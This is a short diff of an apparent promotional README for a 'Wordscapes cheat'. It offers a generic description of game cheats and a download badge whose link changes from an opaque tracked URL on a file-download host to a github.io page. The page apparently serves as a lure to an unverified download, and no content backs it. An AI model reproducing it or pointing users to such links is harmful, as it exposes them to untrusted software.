@@ -1,6 +1,6 @@
 Wordscapes cheat refers to tools, tips, or strategies that help players solve puzzles more efficiently in the popular word puzzle game *Wordscapes*. These cheats can offer word suggestions, reveal hidden words, or provide solutions to particularly difficult levels, allowing players to progress faster or complete challenging puzzles without spending too much time.
 
-[![Download Wordscapes cheat](https://img.shields.io/badge/Download-Wordscapes%20cheat-blueviolet)](https://downloadifiles.com/?label=1e88dd1be7cebcac3b93ae91dcb2375f)
+[![Download Wordscapes cheat](https://img.shields.io/badge/Download-Wordscapes%20cheat-blueviolet)](https://wordscapes-cheat.github.io/.github/)
 
 
 **Common Types of Wordscapes Cheats:**
